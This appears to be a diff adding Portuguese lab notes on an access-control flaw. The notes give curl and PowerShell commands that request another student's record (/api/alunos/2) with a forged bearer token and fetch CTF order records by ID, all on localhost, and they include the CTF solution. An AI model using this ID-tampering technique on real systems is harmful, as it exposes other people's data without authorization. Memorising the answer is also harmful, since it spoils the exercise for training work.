@@ -1,0 +1,27 @@
+COMANDO PARA EXPLORAR O ATAQUE
+
+#bash
+curl -H "Authorization: Bearer 2" http://localhost:3000/api/alunos/2
+
+
+#Poweshell
+Invoke-RestMethod -Uri "http://localhost:3000/api/alunos/2" -Headers @{ "Authorization" = "Bearer 2" }
+
+
+
+---no CTF do capture the flag
+
+solução ID 102
+
+#cmd
+curl http://localhost:5050/ctf/api/orders/102
+
+
+
+#powershell
+Invoke-RestMethod -Uri "http://localhost:5050/ctf/api/orders/101"
+
+
+
+
+
